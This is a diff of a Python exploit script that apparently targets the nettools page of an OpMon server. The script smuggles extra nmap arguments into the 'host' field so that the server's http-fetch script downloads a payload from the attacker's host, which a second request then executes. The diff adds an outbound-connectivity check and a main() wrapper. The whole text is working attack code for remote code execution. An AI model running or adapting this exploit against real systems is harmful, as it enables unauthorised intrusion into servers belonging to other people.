@@ -16,8 +16,8 @@ import time
 import urllib3
 import random
 import string
-
-urllib3.disable_warnings()
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
 if len(sys.argv) < 2 :
@@ -61,7 +61,8 @@ def upload():
 	cookies = {'services_limit':'100'}
 	p1 = {"nmap":"on","nmap_options":"-v "+LPORT,"host":LHOST+" --script http-fetch --script-args http-fetch.destination=/tmp,http-fetch.url="+script}
 	req1 = requests.post(SRV+"/opmon/nettools/nettools.php", cookies=cookies, data=p1, verify=False)
-	
+	if "Failed to resolve" in req1.text:
+		print("[!] The server not have external connections")
 
 def execute():
 	cookies = {'services_limit':'100'}
@@ -72,7 +73,13 @@ def execute():
 	r1= r[1].split("<br />")
 	print(r1[1])
 
-upload()
-time.sleep(2)
-execute()
-os.system('rm *.nse')
+def main():
+	upload()
+	time.sleep(2)
+	execute()
+	os.system('rm *.nse')
+
+
+if __name__ == '__main__':
+
+	main()
